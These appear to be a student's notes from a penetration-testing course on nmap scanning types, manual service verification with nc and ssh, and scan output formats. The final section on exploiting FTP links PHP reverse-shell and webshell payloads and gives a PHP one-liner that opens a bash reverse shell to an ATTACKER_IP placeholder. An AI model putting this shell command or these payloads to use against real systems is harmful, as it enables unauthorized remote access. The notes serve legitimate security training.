# Network Services
#practicaltools 


## Network Services
1. Run a basic nmap, identify that host is up and has some services
2. Nmap "believes" things like FTP are up based on its own experience.
3. Loves looking at NFS shares
4. Ran Wireshark while running nmap
5. Few things to note. 
6. - Packets may be out of order
7. - Sends a "syn" first to see if the host is alive by sending to 80 and 443 as well as doing a ping sweep
8. Qasim called the "SYN" scan a bad habit. First, it is not a stealth scan because modern firewalls will catch you, second, your still generating a ton of traffic. OffSec does not teach this.
9. View the man pages, note the various important flags
10. -sS, -sT-, sA,-sF,-sX
11. -sX is the "Christmas" scan that you use when trying to break down the walls. It can confuse the target firewall and other defenses.
12. Then ran a Christmas scan
13. - Noted the open\filtered. Doesn't get a proper response, so hard to see if things are closed. 
14. UDP is the same way. It cannot tell you what happened on the other side
15. Can you `--reason` to get a reason why it came back. 
16. Below is combined. 
17. Do a -sTV scan together. Find SSH, verify it via `ssh -v <target>` and find the verison. Manual verification!
18. Verify the nginx version with `nc 80 <target>` then `GET / HTTP/1.1` and will see `nginx/1.10.3 (Ubuntu)`
19. 19. Got granular with -sTV -p 80 -reason -vvv
20. Then used a list with -iL file.txt
21. Goes into detail about what the script scan does, the types of information it exposes, etc.
22. Goes into detail with how to use greppable with big lists of hosts, grepping what is up.
23. Talked about XML being useful for other tools. References `eyewittness` to talk about tools that can screenshot web pages. 
24. Engaging with a port on nc is valuable becuse it is stealthy and you can do single commands





For exploiting the ftp service

First, anonymous login to FTP. Can get a php reverse shell with this repo https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
or you can get a webshell https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
and you can use a php oneline script https://w00troot.blogspot.com/2017/05/getting-reverse-shell-from-web-shell.html but must change it to `php -r '$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);exec("/bin/bash -i <&3 >&3 2>&3");'` with your IP, catch it with nc